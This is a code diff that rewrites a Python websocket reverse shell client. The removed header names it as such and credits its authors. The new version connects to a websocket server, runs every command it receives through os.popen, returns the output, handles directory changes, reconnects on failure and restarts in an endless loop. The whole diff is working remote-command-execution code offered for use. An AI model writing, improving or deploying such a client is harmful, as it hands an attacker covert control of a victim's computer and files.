@@ -1,135 +1,100 @@
 import os
-import time
-import websocket
+import asyncio
+import websockets
 from threading import Thread
+import time
 
 
-"""
-    | - Intelligent Websocket Reverse shell Client - |
-       | -  Made by NiGhTFuRy, Vaxer, MainSilent - |
-        | ~ Redesign and Optimized By NiGhTFuRy ~ |
-"""
-
-
-class cc:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    
-address = "" # Copy the ws/wss link here
-
-
-def on_message(ws, cmd : str):
-    """Receive system commands and execute them."""
-    cmd = cmd.strip()
-    try:
-        if len(cmd) > 0:
-            # <- ---- list current directory contents ---- ->
-            if cmd.startswith("dir") and len(cmd) < 4:
-                ws.send("\n | ".join(os.listdir()))
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            elif cmd.startswith("cmd") or cmd.startswith("powershell"):
-                ws.send("[!] starting a new shell is not supported yet.")
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-
-                
-            elif cmd.startswith("ls") and len(cmd) < 3:
-                ws.send("\n | ".join(os.listdir()))
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-                
-            # <- ----  get current directory path ---- ->
-            elif cmd.startswith("cd") and len(cmd) < 3:
-                ws.send(f"{os.getcwd()}>")
-            elif cmd.startswith("pwd") and len(cmd) < 4:
-                ws.send(f"{os.getcwd()}>")
-                
-            # <- ----  Change Directory ---- ->
-            elif cmd.startswith("cd") and len(cmd) > 3:
-                os.chdir(cmd[3:])
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            elif len(cmd) == 2 and ":" in cmd:
-                os.chdir(cmd)
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            # <- ---- Make, Delete a File ---- ->
-
-            elif cmd.startswith("touch") and len(cmd) > 6:
-                with open(f'{cmd[6:]}', mode='a'): pass
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            elif cmd.startswith("del"):
-                os.remove(cmd[4:])
-                ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            
-
-
-            elif cmd.startswith("rn"):
-                cmds = cmd.split()
-                if len(cmds) != 3:
-                    ws.send(f"[!] Error: This coommand only takes 2 arguments -> rn test.txt noob.txt")
-                    ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-                else:
-                    os.rename(cmds[1], cmds[2])
-                    ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-
-            else:
-                try:
-                    data = os.popen(cmd).read()
-                    if len(data) > 0:
-                        ws.send(data)
-                        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-                    else:
-                        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-                except Exception as e:
-                    ws.send(e)
-                    print(e)
-        else:
-            ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-            
-
-    except Exception as e:
-        ws.send("[!] Error executing command")
-        ws.send(f"[!] {e}")
-        ws.send(cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC)
-        print(e)
+class Client:
+    """Client class that manages overall behavior"""
+    def __init__(self, uri):
+        self._uri = uri
         
-def on_open(ws):
-    pwwd = cc.OKBLUE + "("+ cc.FAIL + f"{os.getlogin()}💀windows" + cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC
-    print(cc.OKGREEN +"[>] "+ cc.ENDC + "WebSocket connection established")
-    ws.send(pwwd)
+        self._cc = {
+            'OKBLUE' : '\033[94m',
+            'FAIL' : '\033[91m',
+            'ENDC' : '\033[0m',
+        }
 
-def on_close(ws):
-    print(cc.FAIL + "[>] " + cc.ENDC+ "Connection Closed")
+    def _pwd(self):
+        """Returns the current path"""
+        return (self._cc["OKBLUE"] + "("+ self._cc["FAIL"] +f"{os.getlogin()}💀windows"+ 
+                self._cc["ENDC"] + self._cc["OKBLUE"] + ")-[" + self._cc["ENDC"] + 
+                f"{os.getcwd()}" + self._cc["OKBLUE"] + "]>" + self._cc["ENDC"])
 
-def on_error(ws, error):
-    time.sleep(3)
-    ws.send(error)
-    print(error)
+    async def _connect(self, bug=False):
+        """Manages the connection (websocket)"""
+        async with websockets.connect(self._uri) as ws:
+            await ws.send(self._pwd())
+            if bug:
+                await ws.send("No such commad or there was an Error")
+                await ws.send(self._pwd())
+            while True:
+                try:
+                    await self._handler(ws)
+                except websockets.exceptions.ConnectionClosedError:
+                    await self._connect(bug=True)
+                except websockets.ConnectionClosedOK:
+                    break
 
-def connect():
-    """Establish a connection to the address, then call receiver()"""
-    while True:
+    async def _handler(self, ws):
+        """Checks all incoming commands"""
+        event_loop = asyncio.get_running_loop()
+        cmd = await ws.recv()
+        cmd = cmd.strip().split()
+
+        if cmd and cmd[0] not in ["cmd","powershell"]:
+            if cmd[0] == "cd" or ":" in cmd[0]:
+                await event_loop.create_task(self._check_cd(cmd , ws))
+                await ws.send(self._pwd())
+            else:
+                await event_loop.create_task(self._check_others_cmd(cmd,ws))
+                await ws.send(self._pwd())
+        elif cmd and cmd[0] in ["cmd","powershell"]:
+            await ws.send("you can't spawn a new shell (cmd or powershell)")
+            await ws.send(self._pwd())
+        else:
+            await ws.send(self._pwd())
+
+    async def _check_cd(self, cmd, ws):
+        """Manages change directory commads"""
         try:
-            ws = websocket.WebSocketApp(address, on_open=on_open, on_message=on_message, on_close=on_close, on_error=on_error)
-            ws.run_forever()
+            if len(cmd) > 1:
+                if cmd[1] != "..":
+                    os.chdir(cmd[1])
+                else:
+                    os.chdir(cmd[1] + "\\")
+            elif ":" in cmd[0]:
+                os.chdir(cmd[0])
         except Exception as e:
-            print("Connection Error: " + str(e))
-            time.sleep(5)
-            continue
+            await ws.send(str(e))
 
+    async def _check_others_cmd(self, cmd, ws):
+        """Manages other commads"""
+        try:
+            r = os.popen(" ".join(cmd)).read()
+            await ws.send(r)
+        except Exception as e:
+            await ws.send(str(e))
+
+    def run(self):
+        """Runs the client"""
+        asyncio.run(self._connect())
+
+def start():
+    address = "ws://127.0.0.1:8765"
+    client = Client(address)
+    client.run()
+    
 if __name__ == "__main__":
-
     while True:
         try:
             print("Creating new worker...")
-            p = Thread(target=connect)
+            p = Thread(target=start)
             p.start()
             p.join()
             print("Worker terminated\n")
         except:
             time.sleep(2)
             pass
+    
